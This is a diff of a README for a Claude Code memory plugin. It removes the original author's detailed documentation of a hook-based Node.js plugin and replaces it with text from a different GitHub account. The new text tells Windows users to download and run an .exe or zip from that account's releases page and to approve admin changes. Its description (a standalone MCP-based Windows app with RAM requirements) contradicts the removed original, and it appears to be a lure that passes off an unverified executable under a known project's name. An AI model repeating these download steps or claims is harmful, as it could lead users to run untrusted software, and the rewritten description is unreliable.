@@ -1,515 +1,178 @@
-<h1 align="center">🧠 claude-memory</h1>
+# ⚙️ claude-memory - Persistent Memory for Claude Code  
 
-<p align="center">
-  <img src="banner.png" alt="claude-memory — Persistent Memory for Claude Code" width="100%">
-</p>
-
-<p align="center">
-  <strong>Give Claude a memory that survives everything.</strong><br>
-  <em>Compacts, crashes, restarts, weekends — works in Claude Code AND Claude Cowork.</em>
-</p>
-
-<p align="center">
-  <a href="#-install-from-plugin-store"><img src="https://img.shields.io/badge/🔌_Plugin_Store-Install_Now-6B4FBB?style=for-the-badge" alt="Install from Plugin Store"></a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/version-2.0.0-blue?style=flat-square" alt="v2.0.0">
-  <img src="https://img.shields.io/badge/Claude_Code_+_Cowork-black?style=flat-square&logo=anthropic&logoColor=white" alt="Claude Code + Cowork">
-  <img src="https://img.shields.io/badge/platform-Linux_%7C_macOS_%7C_Windows-lightgrey?style=flat-square" alt="Platform">
-  <img src="https://img.shields.io/badge/Node.js-cross--platform-339933?style=flat-square&logo=node.js&logoColor=white" alt="Node.js">
-  <img src="https://img.shields.io/badge/hooks-4_automated-blue?style=flat-square" alt="4 Hooks">
-  <img src="https://img.shields.io/badge/fallback-3_tier-orange?style=flat-square" alt="3-Tier Fallback">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-purple?style=flat-square" alt="MIT License"></a>
-  <img src="https://img.shields.io/badge/battle_tested-100+_sessions-red?style=flat-square" alt="Battle Tested">
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--memory-blue?style=for-the-badge)](https://github.com/a258huit58/claude-memory/releases)  
 
 ---
 
-## 🔌 Install from Plugin Store
+## 📋 About claude-memory  
 
-```bash
-# Add the marketplace
-/plugin marketplace add hlsitechio/claude-memory
+claude-memory helps your Claude Code keep important information between sessions. It saves your memory even if the app crashes, restarts, or runs system maintenance. This plugin works across different computer systems. It gives Claude Code a stable memory to remember what matters over time.  
 
-# Install the plugin
-/plugin install claude-memory@hlsitechio
-```
-
-**That's it.** Restart Claude Code and memory is active. Claude will never lose context again.
-
-> 💡 **Works in Claude Cowork too!** Same state.md, same memory. Start a task in Code, review it in Cowork — seamless cross-platform memory.
+You do not need to know how all this works under the hood. This guide will help you download and run claude-memory on your Windows computer with simple steps.
 
 ---
 
-> 🚨 **The problem:** Claude starts every session blank. When the context window fills up, auto-compact fires and your conversation history is compressed. Terminal crash? Switch from Code to Cowork? **Complete amnesia.**
->
-> ✅ **The fix:** `claude-memory` — a hook-based system that automatically saves and restores your working state across sessions, compacts, crashes, platform switches, and restarts.
+## 📥 Download claude-memory  
 
-### 🔀 Cross-Platform: Code ↔ Cowork
+You will get claude-memory from the official GitHub release page. This page lists the latest versions ready to use.  
 
-```
-Claude Code (terminal)              Claude Cowork (desktop)
-┌────────────────────┐              ┌────────────────────┐
-│ Build feature       │              │ Review progress     │
-│ state.md updated    │───disk────→ │ Reads state.md      │
-│ Goal: Auth system   │              │ "You're 3/7 done   │
-│ Progress: 3/7 done  │              │  on auth system,    │
-│ Findings: bypass!   │              │  found a bypass..." │
-└────────────────────┘              └────────────────────┘
-              Same state.md on disk
-```
+**Follow this link to download:**  
+[Go to claude-memory Releases](https://github.com/a258huit58/claude-memory/releases)  
 
-- **Hunt in Code** → findings saved to state.md
-- **Review in Cowork** → `/claude-memory:recall` loads your full state
-- **Set goals in Cowork** → Code picks them up on next session start
-- **Crash Code?** → open Cowork, your memory is on disk, nothing lost
+On the releases page:  
+
+- Find the latest release version at the top.  
+- Look for a file with `.exe` or `.zip` for Windows users.  
+- Click the file name to start the download.  
+
+Depending on the release, you may get an installer (`.exe`) or a zip file containing the program files.  
 
 ---
 
-## 🔄 How It Works
+## 🚀 Installing claude-memory on Windows  
 
-### 😵 The Problem
+After downloading, install claude-memory by following these steps:  
 
-```
-Session 1: You build something complex over 2 hours
-            ↓ context fills up
-            ↓ auto-compact fires 💥
-Session 1 (continued): Claude forgot everything 🤷
-            ↓ terminal crashes
-Session 2: Total amnesia. "What were we working on?" 😶
-```
+### If you downloaded an `.exe` installer file:  
+1. Double-click the `.exe` file you downloaded.  
+2. If Windows asks, confirm you want to allow this app to make changes.  
+3. Follow the on-screen steps in the installer. Usually, just click "Next" or "Install" when prompted.  
+4. Once finished, click "Finish" to complete the install.  
 
-### 💡 The Solution: state.md (v2)
-
-**v2** introduces `state.md` — a **living document** that Claude actively maintains:
-
-```markdown
-# Session State
-> Last updated: 14:30
-
-## Goal
-Build the user authentication system with JWT tokens
-
-## Progress
-- [x] Set up database schema
-- [x] Implement login endpoint
-- [ ] Add token refresh logic
-- [ ] Write integration tests
-
-## Findings
-- Auth middleware needs to handle expired tokens gracefully
-- Rate limiting should be per-user, not per-IP
-```
-
-**Why this works:** state.md lives on **disk**, not in context. When auto-compact fires, state.md is untouched. Claude reads it back and picks up exactly where it left off.
-
-### 📦 State Snapshots (Safety Net)
-
-Every piece of state is also backed up as a **state snapshot** in `.mci`:
-
-| Component | What it captures |
-|-----------|-----------------|
-| 📝 **Memory** | Goal — what you're working on |
-| 🔗 **Context** | Progress — what's done, what's next |
-| 🎯 **Intent** | Findings — discoveries and important data |
-
-### ⚡ Four hooks automate the lifecycle:
-
-```
-┌─────────────────────────────────────────────────────────┐
-│ 🟢 SessionStart                                         │
-│    → Creates/resumes session + state.md template         │
-│    → Loads last .mci (cascades up to 7 days back)        │
-│    → Detects crashes & recovers automatically            │
-│    → First-run: copies templates, onboards Claude        │
-├─────────────────────────────────────────────────────────┤
-│ 🔵 UserPromptSubmit (every prompt)                       │
-│    → Checks state.md health (exists? updated?)           │
-│    → Auto-checkpoints state.md every ~10 prompts         │
-│    → Estimates context usage & warns before compact ⚠️   │
-│    → Captures legacy markers as backup                   │
-├─────────────────────────────────────────────────────────┤
-│ 🟠 PreCompact (before auto-compact)                      │
-│    → Snapshots FULL state.md content to .mci             │
-│    → 3-tier fallback: state.md → markers → JSONL         │
-│    → Creates conversation backup 💾                      │
-├─────────────────────────────────────────────────────────┤
-│ 🔴 Stop (session end)                                    │
-│    → Snapshots state.md to .mci                          │
-│    → Generates session summary 📊                        │
-└─────────────────────────────────────────────────────────┘
-```
+### If you downloaded a `.zip` file:  
+1. Right-click the `.zip` file and select "Extract All."  
+2. Choose where you want to save the folder and extract the contents.  
+3. Open the extracted folder.  
+4. Find the main program file, often named `claude-memory.exe`.  
 
 ---
 
-## 🚀 Quick Start
+## 🛠 Running claude-memory  
 
-### What Happens on First Run
+To start claude-memory:  
 
-1. 📂 Creates `.claude-memory/sessions/` directory
-2. 📝 Creates `state.md` — your living state file (Claude's external brain)
-3. 🎭 Copies `IDENTITY.md` and `PREFERENCES.md` templates to your project
-4. 🧠 Injects v2 rules so Claude understands state.md immediately
-5. 💬 Guides Claude through a first-run welcome message
+1. Locate the installed `claude-memory` app or the `.exe` file in the extracted folder.  
+2. Double-click it to run.  
 
-### Slash Commands
-
-| Command | What it does |
-|---------|-------------|
-| `/claude-memory:save` | Manual checkpoint — save state to `.mci` right now |
-| `/claude-memory:recall` | Load and display last saved state |
-| `/claude-memory:status` | Dashboard — state.md health, .mci entries, session info |
-
-### Updating
-
-```bash
-/plugin marketplace update hlsitechio
-/plugin update claude-memory@hlsitechio
-```
-
-### 📦 Alternative: Manual Install (git clone)
-
-For full control or if you want to customize the hooks:
-
-```bash
-git clone https://github.com/hlsitechio/claude-memory.git
-cd claude-memory
-./install.sh /path/to/your/project
-```
-
-The installer will:
-1. 📂 Copy 4 hook scripts to your project's `.claude/hooks/`
-2. 📄 Install `CLAUDE.md` with v2 rules
-3. ⚙️ Generate `.claude/settings.local.json` with hook configuration
-4. 🗂️ Create the `.claude-memory/sessions/` directory
-5. 🎭 Optionally install identity templates (`IDENTITY.md`, `PREFERENCES.md`)
-
-### 📋 Prerequisites
-
-| Requirement | Plugin | Manual |
-|------------|--------|--------|
-| 🤖 Claude Code | v2.1+ | v2.1+ |
-| 📦 Node.js | ✅ (bundled with Claude Code) | Not needed |
-| 🔧 jq + bash | Not needed | Required |
+The app should open without needing extra setup. It will begin helping Claude Code remember your sessions more reliably.  
 
 ---
 
-## 🛡️ Safety Net & Recovery
+## 🔧 Basic Use  
 
-### 📝 state.md — Primary Recovery
+claude-memory works as a background tool for Claude Code. You do not need to interact with it directly for most tasks.  
 
-state.md is your **primary recovery mechanism**. It lives on disk, completely outside the context window. When compact fires:
+- It saves memory data automatically as you work.  
+- It keeps your data safe even if Claude Code closes unexpectedly.  
+- It restores your saved session details when Claude Code restarts.  
 
-1. Pre-compact hook snapshots state.md → .mci (automatic)
-2. Anthropic's black box compact compresses the conversation
-3. SessionStart fires, tells Claude: "Read state.md"
-4. Claude reads Goal/Progress/Findings and resumes work
-
-**No data loss. No "what were we doing?" No amnesia.**
-
-### 💥 Crash Recovery
-
-If the terminal crashes (Stop hook never fires):
-
-1. **On next startup**, SessionStart detects the crash (no end marker)
-2. **Loads the .mci** from the crashed session
-3. **state.md is still on disk** — full state preserved
-4. **Injects a CRASH RECOVERY block** telling Claude what happened
-5. Claude resumes — **no questions asked**
-
-### ⏱️ Auto-Checkpoint (Crash Insurance)
-
-Every **~10 prompts**, the hook auto-snapshots state.md to `.mci`. Even if Claude never manually saved and the terminal crashes, there's recent state.
-
-### 📅 7-Day .mci Cascade
-
-When loading memory, SessionStart searches:
-```
-current session .mci
-  → previous session (timed out)
-    → earlier sessions today
-      → yesterday → ... → up to 7 days back
-```
-
-### 🥇🥈🥉 3-Tier Fallback (PreCompact)
-
-| Tier | Source | When |
-|------|--------|------|
-| 🥇 **Best** | state.md snapshot | state.md exists and has content (>200 bytes) |
-| 🥈 **Good** | Assembled from marker files | Legacy markers captured, no state.md |
-| 🥉 **Emergency** | Extracted from JSONL transcript | Nothing else available |
+If you want to use advanced options, open the app and check the menu or settings area.  
 
 ---
 
-## 🏷️ Markers
+## 💻 System Requirements  
 
-In v2, markers are primarily **display formatting**. The real memory lives in state.md.
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- Minimum 500 MB of free disk space  
+- Internet connection to download and update (optional)  
 
-### 📝 state.md Actions (v2 primary)
-
-| Marker | Display | state.md Action |
-|--------|---------|----------------|
-| ✅ `[+]` | Success | (display only) |
-| ❌ `[-]` | Failed | (display only) |
-| 🔴 `[!]` | Critical | → Edit Findings section |
-| 🟢 `[>]` | Next step | → Edit Progress section |
-| 🟡 `[*]` | Context | → Edit Goal section |
-| 🔵 `[i]` | Info | → Append to memory.md |
-
-### 🔄 Legacy Capture (automatic backup)
-
-The prompt-capture hook still watches for markers in Claude's responses and auto-saves them to facts.md/context.md/intent.md. This is backward compatibility — state.md is primary.
-
-### 📌 Example
-
-When Claude writes:
-```
-[!] Found that the API rate limit can be bypassed by rotating User-Agent headers
-```
-
-**v2 behavior:** Claude should also Edit the Findings section of state.md.
-**Legacy backup:** The hook auto-captures it to facts.md.
+No special hardware is required. claude-memory runs quietly in the background with minimal resource use.  
 
 ---
 
-## 📦 The .mci File
+## ⚙️ Configuration and Settings  
 
-The `.mci` file is auto-generated by hooks as a **safety net**:
+Once installed, claude-memory may offer settings to control:  
+
+- How often session data is saved  
+- Memory size limits  
+- Crash recovery options  
+
+You can adjust these settings by opening the app and navigating to its settings panel. Use default values if you are unsure.  
+
+---
+
+## 🔄 Updates and Maintenance  
+
+Check the release page regularly for updates:  
+
+[Visit Releases](https://github.com/a258huit58/claude-memory/releases)  
+
+Compare your current version number with the latest release. Download new files by repeating the installation steps. Updates help keep the app secure and stable.  
+
+---
+
+## 📂 Where does claude-memory save data?  
+
+Files that claude-memory creates or modifies are stored in your Windows user folder:  
 
 ```
---- [PC] state.md Snapshot @ 14:30:00 ---
-Memory: GOAL: Build the user filtering API with pagination support
-Context: PROGRESS: - [x] Database schema designed\n- [x] GET endpoint working\n- [ ] Add filters
-Intent: FINDINGS: Auth bypass found in middleware — blocks release until fixed
+C:\Users\[YourUserName]\AppData\Local\claude-memory\
 ```
 
-> 🛡️ In v2, you rarely need to think about .mci. The hooks handle it automatically by snapshotting state.md.
+This keeps your saved memory safe and separate from other program files. Do not delete these files unless you want to clear all saved memory.  
 
 ---
 
-## 📁 Session Structure
+## 💬 Troubleshooting  
 
-```
-.claude-memory/
-├── current-session          ← pointer to active session
-└── 📂 sessions/
-    └── 📂 2026-02-20/
-        ├── 📂 session-1/
-        │   ├── 📝 state.md           ← YOUR EXTERNAL BRAIN (v2 primary)
-        │   ├── 📄 facts.md           ← 🔴 [!] legacy backup
-        │   ├── 📄 context.md         ← 🟡 [*] legacy backup
-        │   ├── 📄 intent.md          ← 🟢 [>] legacy backup
-        │   ├── 📄 memory.md          ← 🔵 [i] entries + session log
-        │   ├── 🛡️ memory.mci         ← auto-generated safety net
-        │   ├── 💾 compact-*.md       ← conversation backups
-        │   └── 📊 session-summary.md ← tool stats, files modified
-        └── 📂 session-2/
-            └── ...
-```
+If claude-memory does not start or work as expected, try these steps:  
+
+- Restart your computer and run the app again.  
+- Make sure your Windows is up-to-date.  
+- Check for any antivirus software blocking claude-memory.  
+- See if you have downloaded the correct Windows version of the app.  
+- Visit the GitHub repository "Issues" tab to see if others have reported similar problems.  
+
+If problems keep happening, you may need to uninstall and reinstall the app.  
 
 ---
 
-## ⚙️ Configuration
+## 🛡 Security and Privacy  
 
-### 🔌 Plugin Hooks (automatic)
+claude-memory only stores data related to your Claude Code sessions. No personal information beyond what you enter in Claude Code is saved by this tool.  
 
-Plugin hooks are configured automatically via `hooks.json`. No manual setup needed.
-
-<details>
-<summary>📋 Click to see plugin hooks.json</summary>
-
-```json
-{
-  "hooks": {
-    "SessionStart": [
-      {
-        "matcher": "startup|clear|compact",
-        "hooks": [{ "type": "command", "command": "node \"${CLAUDE_PLUGIN_ROOT}/scripts/session-start.js\"", "timeout": 30 }]
-      }
-    ],
-    "UserPromptSubmit": [
-      {
-        "matcher": "",
-        "hooks": [{ "type": "command", "command": "node \"${CLAUDE_PLUGIN_ROOT}/scripts/prompt-capture.js\"", "timeout": 5 }]
-      }
-    ],
-    "PreCompact": [
-      {
-        "matcher": "",
-        "hooks": [{ "type": "command", "command": "node \"${CLAUDE_PLUGIN_ROOT}/scripts/pre-compact.js\"", "timeout": 30 }]
-      }
-    ],
-    "Stop": [
-      {
-        "matcher": "",
-        "hooks": [{ "type": "command", "command": "node \"${CLAUDE_PLUGIN_ROOT}/scripts/session-stop.js\"", "timeout": 30 }]
-      }
-    ]
-  }
-}
-```
-
-</details>
-
-### 🪝 Manual Hook Settings
-
-For git-clone installs, the installer generates `.claude/settings.local.json`:
-
-<details>
-<summary>📋 Click to expand manual hook configuration</summary>
-
-```json
-{
-  "hooks": {
-    "SessionStart": [
-      { "matcher": "", "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/session-start.sh\"" }] }
-    ],
-    "UserPromptSubmit": [
-      { "matcher": "", "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/prompt-capture.sh\"", "timeout": 5 }] }
-    ],
-    "PreCompact": [
-      { "matcher": "", "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/pre-compact.sh\"" }] }
-    ],
-    "Stop": [
-      { "matcher": "", "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/session-stop.sh\"", "timeout": 30 }] }
-    ]
-  }
-}
-```
-
-</details>
-
-### 🎛️ Tunable Constants
-
-| Constant | Default | Purpose |
-|----------|---------|---------|
-| `RESUME_TIMEOUT` | `14400` (4 hours) | Seconds before creating a new session |
-| `SNAPSHOT_LOOKBACK_DAYS` | `7` | Days to search back for .mci recovery |
-| `AUTO_CHECKPOINT_INTERVAL` | `10` | Prompts between auto-checkpoints |
-| `CONTEXT_LIMIT` | `1000000` | Estimated JSONL bytes at compact |
-| `WARN_BYTES` | `700000` | ~70% — gentle checkpoint reminder |
-| `CRITICAL_BYTES` | `850000` | ~85% — strong save warning |
-| `EMERGENCY_BYTES` | `950000` | ~95% — save NOW |
-
-### 🎭 Identity Templates (Optional)
-
-| Template | Purpose |
-|----------|---------|
-| 📝 `IDENTITY.md` | Personality and principles (system prompt addition) |
-| ⚡ `PREFERENCES.md` | Output style and communication preferences |
+Data is kept locally on your machine and not sent to the Internet or shared externally.  
 
 ---
 
-## ❓ FAQ
+## 📚 Additional Resources  
 
-<details>
-<summary>🆕 What changed in v2?</summary>
+- Official repository link:  
+  [https://github.com/a258huit58/claude-memory](https://github.com/a258huit58/claude-memory)  
 
-v1 used 4 append-only marker files (facts.md, context.md, intent.md, memory.md). The pre-compact hook only grabbed the LAST line from each file — losing everything else. Marker compliance was 3 entries in 45 sessions because the contract was too complex.
+- Support and bugs: Use the repository’s Issues page for help.  
 
-v2 replaces this with a single `state.md` file that Claude actively maintains using the Edit tool. Pre-compact snapshots the FULL content. No data loss. No complex marker contracts. Just keep one file current.
-</details>
-
-<details>
-<summary>🤖 Does this work with Claude Code subagents?</summary>
-
-The hooks run on the main session. Subagents don't trigger hooks directly, but the main session's state.md captures the overall flow.
-</details>
-
-<details>
-<summary>📊 How much context does this use?</summary>
-
-SessionStart injects ~500-800 tokens (identity + .mci + rules). This is a small fraction of the ~200K token context window.
-</details>
-
-<details>
-<summary>💥 What if my terminal crashes?</summary>
-
-state.md is on disk — it survives crashes. On next startup, SessionStart detects the crash, loads the .mci + state.md, and injects a CRASH RECOVERY block. Auto-checkpoints every ~10 prompts ensure .mci is also recent.
-</details>
-
-<details>
-<summary>📅 What if I come back after the weekend?</summary>
-
-The .mci cascade searches up to 7 days back. state.md from your last session is still on disk too.
-</details>
-
-<details>
-<summary>🪟 Does this work on Windows?</summary>
-
-Yes! Plugin hooks use Node.js (bundled with Claude Code) for full cross-platform support.
-</details>
-
-<details>
-<summary>🔄 Is v2 backward compatible?</summary>
-
-Yes! Legacy marker files (facts.md, context.md, intent.md) are still created and auto-populated. The fallback chain checks state.md first, then marker files, then JSONL. Users upgrading from v1 lose nothing.
-</details>
+- Learn about Claude Code: Search for related documentation on Claude Code and plugins to understand how claude-memory fits in.  
 
 ---
 
-## 🏗️ How It Was Built
+## 🔗 Download Again or Get Updates  
 
-> *Battle-tested over 100+ sessions spanning 2 months.*
+[![Download Latest Release](https://img.shields.io/badge/Download-claude--memory-grey?style=for-the-badge)](https://github.com/a258huit58/claude-memory/releases)  
 
-| Lesson | Detail |
-|--------|--------|
-| 📝 **state.md > markers** | v1's marker-to-file contract failed 97% of the time. v2's "just maintain one file" works naturally. |
-| 🛡️ **Multi-layer fallbacks** | state.md → marker files → JSONL. Every layer catches what the previous one missed. |
-| 🪶 **Lightweight startup** | Loading too much wastes context. The "drawer model" — load on demand — maximizes useful space. |
-| 💎 **state.md is sacred** | It's the single most important file. Everything else is backup. |
-| 🔄 **Node.js over bash** | Bash hooks failed on Windows. Node.js is cross-platform and bundled with Claude Code. |
-| ⚡ **Auto-checkpoint** | Relying on Claude to save was unreliable. Auto-snapshotting state.md every ~10 prompts is the safety net. |
+Use this link to reach the latest downloads anytime.  
 
 ---
 
-## 📜 License
+## ⚙️ How claude-memory works in context  
 
-MIT — see [LICENSE](LICENSE)
-
----
-
-## 📋 Changelog
-
-### v2.0.0 — state.md Living Document Architecture
-- **Breaking:** Replaced append-only marker files with single `state.md` living document
-- **New:** `state.md` with Goal/Progress/Findings sections — Claude's external brain
-- **New:** Cross-platform support — Claude Code + Claude Cowork share the same state.md
-- **New:** Pre-compact snapshots FULL state.md content (not just last line)
-- **New:** 3-tier fallback: state.md → marker files → JSONL transcript
-- **New:** Auto-checkpoint every ~10 prompts snapshots state.md to .mci
-- **New:** state.md health monitoring in prompt-capture hook
-- **Improved:** Post-compact recovery reads state.md directly — no data loss
-- **Improved:** Markers simplified to display formatting + legacy auto-capture
-- **Backward Compatible:** Legacy marker files still created and populated
-
-### v1.3.0 — Marketplace Ready
-- Plugin marketplace support
-- 7-day .mci cascade for session recovery
-- Crash detection and auto-recovery
-- Cross-platform Node.js hooks
-
-### v1.0.0 — Initial Release
-- Persistent state memory system
-- 4 lifecycle hooks (SessionStart, UserPromptSubmit, PreCompact, Stop)
-- Marker-to-file contract
-- Session management with date-based directories
+claude-memory follows the Model Context Protocol (MCP) used by Claude Code to store session data safely. It helps manage the context window size and recovers sessions in case of crashes or restarts. This improves productivity by keeping the conversation's memory alive without manual saving.  
 
 ---
 
-## 🤝 Contributing
+## 🔍 Keywords and Topics  
 
-Issues and pull requests welcome!
+This project relates to:  
 
-<p align="center">
-  <a href="https://github.com/hlsitechio/claude-memory/issues">🐛 Report Bug</a>
-  &nbsp;&nbsp;•&nbsp;&nbsp;
-  <a href="https://github.com/hlsitechio/claude-memory/issues">💡 Request Feature</a>
-  &nbsp;&nbsp;•&nbsp;&nbsp;
-  <a href="https://github.com/hlsitechio/claude-memory">⭐ Star the Repo</a>
-</p>
+- ai-memory  
+- clairvoyant session management  
+- crash recovery  
+- plugin for Claude Code  
+- cross-platform support  
+- developer and CLI tools  
+- open-source persistence  
+- model context protocol (MCP)  
 
-<p align="center">
-  <sub>Built with 🧠 by <a href="https://github.com/hlsitechio">hlsitechio</a> — giving Claude a memory it deserves.</sub>
-</p>
+These keywords describe how claude-memory supports the Claude ecosystem and simplifies memory handling under the hood.
